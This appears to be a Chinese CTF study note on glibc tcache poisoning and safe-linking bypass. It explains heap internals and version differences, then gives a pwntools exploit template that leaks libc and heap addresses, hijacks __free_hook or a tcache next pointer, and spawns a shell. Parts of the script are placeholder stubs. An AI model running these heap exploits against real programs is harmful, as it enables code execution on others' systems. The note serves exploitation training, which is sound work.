---
title: tcache poisoning 与 safe-linking 绕过（2.26 ~ 2.41）
category: pwn
tags: [tcache, tcache poisoning, safe-linking, double free, heap]
signals: [菜单式 add/del/edit/show 堆题, 题目 libc 2.31 或 2.35, free 之后还能 edit (UAF), double free 未检测, 申请大小 < 0x410, 有 heap 泄露]
difficulty: hard
source: "CTF-Wiki Tcache attack / how2heap / ir0nstone Safe Linking"
tools: [pwntools, gdb, pwndbg, glibc-all-in-one, patchelf]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 典型菜单：`1. add 2. del 3. edit 4. show 5. exit`，`add` 会问 size 与 content。
- `del` 后指针未置空，`edit`/`show` 仍能操作 —— **UAF**，这是 tcache 的第一入口。
- chunk size 都在 `0x10 ~ 0x410` 之间（tcache 范围：请求 `<= 0x408`）。
- `checksec` 显示 Full RELRO（GOT 不可写），逼你走 `free_hook` / `_IO_FILE` / 栈。
- 题目给 `libc.so.6` 是 2.31/2.35，决定 `key` 字段与 safe-linking 是否生效。

## 二、原理

tcache 是每线程的 LIFO 单向链表（glibc 2.26 引入），结构：

```c
typedef struct tcache_perthread_struct {
  uint16_t counts[TCACHE_MAX_BINS];      // 64 个 bin
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

typedef struct tcache_entry {
  struct tcache_entry *next;             // 指向下一个 chunk 的 user data
  struct tcache_perthread_struct *key;   // 2.29+ 加入，用于 double-free 检测
} tcache_entry;
```

关键行为：
- `tcache_put`：`e->next = tcache->entries[idx]; tcache->entries[idx] = e;` —— **无完整性检查**。
- `tcache_get`：`tcache->entries[idx] = e->next;` —— 直接返回 `e`，**不校验 `next` 合法性**。
- 每 bin 最多 7 个 chunk，超过回落到 fastbin / unsorted bin。

**tcache poisoning**：改掉空闲 chunk 的 `next`，两次 malloc 后就能拿到任意地址。

版本演进：

| 版本 | 变化 | 对利用的影响 |
|---|---|---|
| 2.26 | 引入 tcache | `next` 明文，直接覆盖 |
| 2.29 | 加 `key` 字段，free 时检查 `e->key == tcache` | double free 需先清 `key` |
| 2.31 | `key` 检查完善了 double-free 迭代检测 | 改 `key` 或用 UAF 改 `next` |
| **2.32** | **safe-linking**：`next = (pos >> 12) ^ ptr` | 必须泄露 heap 才能伪造 |
| 2.34 | 移除 `__free_hook` / `__malloc_hook` | 改用 `_IO_list_all` / exit funcs / 栈 |
| 2.35+ | 新增对齐与 `next` 指向堆内的校验 | 目标地址需 16 字节对齐 |

safe-linking 公式：

```c
#define PROTECT_PTR(pos, ptr) ((__typeof(ptr))((((size_t)(pos)) >> 12) ^ ((size_t)(ptr))))
#define REVEAL_PTR(ptr)       PROTECT_PTR(&ptr, ptr)
// 写入：chunk->next = PROTECT_PTR(&chunk->next, 目标地址)
// 读取：目标 = REVEAL_PTR(chunk->next)
```

## 三、checksec 判读与利用思路

```text
RELRO: Full  Canary: found  NX: enabled  PIE: enabled
libc 2.31 → __free_hook 存在，直接写 __free_hook = system
libc 2.34+ → 无 hook，改用 _IO_2_1_stdout_ / exit handler / 栈 ROP
```

标准三阶段：

1. **泄露 libc**：填满 tcache(7) 后 free 一个 0x410+ 的 chunk 进 unsorted bin，UAF `show` 读出 `main_arena+96` 处的 fd。
2. **泄露 heap（2.32+ 必须）**：UAF `show` 一块仍在 tcache 的 chunk，读出被 mangled 的 `next`，再 `next ^ (addr>>12)` 反推。
3. **劫持**：把 `next` 改为目标地址，连续两次 `add` 拿到目标块，写入 `system` 或 ROP 链。

目标地址选择：

| libc 版本 | 首选目标 | 备注 |
|---|---|---|
| ≤ 2.31 | `__free_hook` / `__malloc_hook` | free 触发 / malloc 触发 |
| 2.34 ~ 2.41 | `_IO_2_1_stdout_` 的 `_chain`（FSOP） | 需伪造 vtable 或改 `_IO_list_all` |
| 任意 | 栈（需栈地址泄露） | 改返回地址为 ROP 链 |
| 任意 | `tcache_perthread_struct` | 绕对齐限制时可先打这里 |

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./pwn")
context.log_level = "info"
libc = ELF(args.LIBC or "./libc.so.6", checksec=False)

def start():
    return remote(args.HOST or "TARGET", int(args.PORT or 1337)) if args.REMOTE else process()
# 备注：本地调试前用 patchelf 把 interpreter 换成题目版本，见「环境搭建」篇

# ---------- 菜单封装（按题目改提示符） ----------
def add(size, data=b""):
    p.sendlineafter(b"> ", b"1"); p.sendlineafter(b"size", str(size).encode())
    p.sendafter(b"data", data)

def delete(idx):
    p.sendlineafter(b"> ", b"2"); p.sendlineafter(b"idx", str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b"> ", b"3"); p.sendlineafter(b"idx", str(idx).encode())
    p.sendafter(b"data", data)

def show(idx):
    p.sendlineafter(b"> ", b"4"); p.sendlineafter(b"idx", str(idx).encode())
    return p.recvline()

# ---------- safe-linking 编解码 ----------
def mangle(pos, ptr): return (pos >> 12) ^ ptr
def demangle(pos, enc): return (pos >> 12) ^ enc

# ---------- 泄漏 ----------
def leak_libc():
    """填满 tcache 后进 unsorted bin，读 fd（main_arena+96）"""
    for _ in range(8): add(0x80, b"a")
    for i in range(7): delete(i)
    add(0x410, b"b"); delete(8)       # 超出 tcache 范围，进 unsorted
    return u64(show(8)[:6].ljust(8, b"\x00"))   # UAF 读 fd

def leak_heap(chunk_pos):
    """UAF 读 tcache chunk 的 mangled next，pos 为 next 字段自身地址"""
    add(0x60, b"a"); add(0x60, b"b")
    delete(0); delete(1); delete(0)    # double free 进 tcache
    return demangle(chunk_pos, u64(show(0)[:8]))

# ---------- 2.31：直接打 __free_hook ----------
def exp_231(p):
    libc_base = leak_libc() - (libc.sym["__malloc_hook"] + 0x10 + 96)
    libc.address = libc_base
    success(f"libc base = {hex(libc_base)}")
    free_hook, system = libc.sym["__free_hook"], libc.sym["system"]

    add(0x60, b"a"); add(0x60, b"b")
    delete(0); delete(1)
    edit(0, p64(free_hook))          # tcache[idx]->next = free_hook（2.31 无 safe-linking）
    add(0x60, b"x")                  # 取出原 chunk
    add(0x60, p64(system))           # 取出 free_hook 并写入 system
    add(0x60, b"/bin/sh\x00")        # 再申请一块放 /bin/sh
    delete(2)                        # free(chunk) → system("/bin/sh")
    p.interactive()

# ---------- 2.32+：safe-linking 版 ----------
def exp_232plus(p, chunk_pos, target):
    """chunk_pos = 目标 tcache chunk 的 next 字段地址；target 需 16 字节对齐"""
    libc.address = int(args.BASE or "0", 16)        # 占位：由泄露步骤填入
    edit(0, p64(mangle(chunk_pos, target)))
    add(0x60, b"x")                                 # 第一次取出原 chunk
    return add(0x60, p64(libc.sym["system"]))       # 第二次写到 target

if __name__ == "__main__":
    p = start()
    (exp_231(p) if args.V231 else exp_232plus(p, int(args.POS or "0", 16), 0xdeadbeef))
    p.interactive()
```

快速确认题目 libc 版本与 hook 是否存在：

```bash
python3 -c "
from pwn import *
libc = ELF('./libc.so.6', checksec=False)
print('version:', libc.version)
for s in ('__free_hook','__malloc_hook','_IO_list_all'):
    print(s, hex(libc.sym[s]) if s in libc.sym else 'ABSENT')
"
```

## 五、常见坑 / 变体

- **2.32+ 忘 mangle**：直接 `p64(target)` 会报 `malloc(): unaligned tcache chunk detected` 或直接崩，必须 `(pos>>12)^target`。
- **对齐检查**：2.32+ `tcache_get` 校验 `aligned_OK(e)`，目标必须 16 字节对齐；2.31 的 `__free_hook` 恰好对齐。
- **`key` 字段未清**：2.29+ double free 前需把 chunk 的 `key` 置 0（UAF `edit` 写 0 到 `+8`）。
- **tcache 满 7 后行为变化**：第 8 个同尺寸 free 落到 fastbin/unsorted，泄漏点和攻击点都变。
- **`calloc` 不走 tcache**：题目用 `calloc` 时必须先把目标塞进 fastbin 或 unsorted。
- **`pos` 取错**：safe-linking 的 `pos` 是 `next` **字段自身地址**（`chunk+0x10`），不是 user data 起点。
- **2.35+ 的 `tcache_put` 检查**：会验证 `e->next` 指向堆内，写目标前先确认题目是否额外加固。

## 六、参考来源

- [CTF-Wiki: Tcache attack](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/tcache-attack/)
- [how2heap: tcache_poisoning.c (glibc 2.31)](https://github.com/shellphish/how2heap/blob/master/glibc_2.31/tcache_poisoning.c)
- [how2heap: tcache_poisoning.c (glibc 2.32)](https://github.com/shellphish/how2heap/blob/master/glibc_2.32/tcache_poisoning.c)
- [ir0nstone: Tcache Poisoning](https://ir0nstone.gitbook.io/notes/binexp/heap/the-tcache/tcache-poisoning)
- [ir0nstone: Safe Linking](https://ir0nstone.gitbook.io/notes/binexp/heap/safe-linking)
- [ir0nstone: Tcache Keys](https://ir0nstone.gitbook.io/notes/binexp/heap/tcache-keys)
- [glibc malloc.c 源码（elixir.bootlin.com）](https://elixir.bootlin.com/glibc/latest/source/malloc/malloc.c)
